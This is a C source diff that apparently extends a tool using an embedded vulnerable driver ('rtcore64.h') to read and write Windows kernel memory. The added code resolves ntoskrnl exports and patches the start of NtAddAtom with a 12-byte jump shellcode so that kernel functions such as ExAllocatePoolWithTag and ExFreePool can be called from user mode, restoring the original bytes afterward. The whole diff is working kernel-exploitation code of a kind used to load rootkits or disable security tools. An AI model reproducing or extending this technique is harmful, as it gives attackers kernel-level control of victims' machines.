@@ -9,6 +9,7 @@
 #include "util.h"
 
 #define DRIVER_NAME_MAX			16
+#define SHELLCODE_SIZE			12
 
 static uint8_t driverBin[] = 
 #include "rtcore64.h"
@@ -33,6 +34,7 @@ static struct {
 	UNICODE_STRING	driverStr;
 	wchar_t		path[MAX_PATH];
 	HANDLE		device;
+	uint8_t		origKernelFun[SHELLCODE_SIZE];
 } state;
 
 static struct {
@@ -40,7 +42,9 @@ static struct {
 		uint64_t ntoskrnl;
 	} module;
 	struct {
-		uint64_t allocpool;
+		uint64_t NtAddAtom;
+		uint64_t ExAllocatePoolWithTag;
+		uint64_t ExFreePool;
 	} fun;
 } export;
 
@@ -221,7 +225,7 @@ void driver_write(PVOID addr, PBYTE buf, SIZE_T bufSize) {
 	}
 }
 
-uint64_t driver_getKernelModule(char *module) {
+uint64_t driver_getKernelModule(char *module, PULONG imageSize) {
 	PRTL_PROCESS_MODULES buf = NULL;
 	ULONG bufSize = 0, i;
 	uint64_t result = 0;
@@ -237,6 +241,7 @@ uint64_t driver_getKernelModule(char *module) {
 	for (i = 0; i < buf->NumberOfModules; ++i) {
 		if (!lstrcmpA(module, buf->Modules[i].FullPathName + buf->Modules[i].OffsetToFileName)) {
 			result = (uint64_t)buf->Modules[i].ImageBase;
+			if (imageSize) *imageSize = buf->Modules[i].ImageSize;
 			break;
 		}
 	}
@@ -270,7 +275,7 @@ uint64_t driver_getKernelExport(uint64_t module, char *fun) {
 	ordinal = (uint16_t*)(export->AddressOfNameOrdinals + delta);
 
 	for (i = 0; i < export->NumberOfNames; ++i) {
-		printf("%s\n", (char*)((uint64_t)funName[i] + delta));
+		//printf("%s\n", (char*)((uint64_t)funName[i] + delta));
 		if (!lstrcmpA((char*)((uint64_t)funName[i] + delta), fun)) {
 			result = module + funAddr[ordinal[i]];
 			break;
@@ -281,11 +286,46 @@ uint64_t driver_getKernelExport(uint64_t module, char *fun) {
 	return result;
 }
 
+void driver_beforeKernelCall(uint64_t fun) {
+	uint8_t shellcode[SHELLCODE_SIZE] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
+
+	*(uint64_t*)&shellcode[2] = fun;
+	driver_read((PVOID)export.fun.NtAddAtom, state.origKernelFun, SHELLCODE_SIZE);
+	driver_write((PVOID)export.fun.NtAddAtom, shellcode, SHELLCODE_SIZE);
+}
+
+void driver_afterKernelCall() {
+	driver_write((PVOID)export.fun.NtAddAtom, state.origKernelFun, SHELLCODE_SIZE);
+}
+
+PVOID driver_ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag) {
+	PVOID result;
+
+	driver_beforeKernelCall(export.fun.ExAllocatePoolWithTag);
+	result = ((ExAllocatePoolWithTag_t)NtAddAtom)(PoolType, NumberOfBytes, Tag);
+	driver_afterKernelCall();
+
+	return result;
+}
+
+VOID driver_ExFreePool(PVOID P) {
+	driver_beforeKernelCall(export.fun.ExFreePool);
+	((ExFreePool_t)NtAddAtom)(P);
+	driver_afterKernelCall();
+}
+
+
 void driver_init() {
-	export.module.ntoskrnl = driver_getKernelModule("ntoskrnl.exe");
+	export.module.ntoskrnl = driver_getKernelModule("ntoskrnl.exe", NULL);
 	printf("%X\n", export.module.ntoskrnl);
-	export.fun.allocpool = driver_getKernelExport(export.module.ntoskrnl, "ExAllocatePoolWithTag");
-	printf("%X\n", export.fun.allocpool);
+	export.fun.NtAddAtom			= driver_getKernelExport(export.module.ntoskrnl, "NtAddAtom");
+	export.fun.ExAllocatePoolWithTag	= driver_getKernelExport(export.module.ntoskrnl, "ExAllocatePoolWithTag");
+	export.fun.ExFreePool			= driver_getKernelExport(export.module.ntoskrnl, "ExFreePool");
+	printf("%X\n", export.fun.NtAddAtom);
+
+	//PVOID remoteBuf = driver_ExAllocatePoolWithTag(NonPagedPool, 0x1000, 0x42777445);
+
+
 	//resolve exports
 	//clear stuff
 }
